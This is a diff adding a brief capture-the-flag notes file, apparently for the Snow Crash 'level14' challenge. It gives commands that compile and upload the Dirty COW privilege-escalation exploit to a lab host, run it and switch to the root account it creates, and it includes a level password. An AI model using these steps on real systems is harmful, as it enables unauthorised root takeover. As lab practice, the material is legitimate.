@@ -1,0 +1,9 @@
+[host]
+gcc -m32 -static -pthread dirty.c -o dirty -lcrypt
+scp -P 4242 dirty level14@192.168.1.16:/tmp/dirty	(2A31L79asukciNyi8uppkEuSx)
+
+[snowcrash]
+chmod +x /tmp/dirty
+/tmp/./dirty
+su firefart
+
